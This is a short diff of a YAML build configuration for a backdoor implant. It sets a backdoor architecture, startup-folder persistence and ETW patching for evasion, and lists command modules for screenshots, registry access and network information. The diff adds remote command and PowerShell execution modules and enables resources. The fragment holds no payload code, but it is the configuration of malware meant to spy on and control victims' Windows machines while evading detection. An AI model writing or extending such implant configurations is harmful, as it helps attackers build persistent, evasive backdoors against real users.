@@ -16,9 +16,13 @@ commands:
   - commands/cmd_screenshot
   - commands/cmd_registry
   - commands/cmd_netinfo
+  - commands/cmd_exec
+  - commands/cmd_exec_powershell
 
 arch: arch/backdoor
 persist: persist/startup_folder
+
+resources: true
 
 evasion:
   - evasion/etw_patch
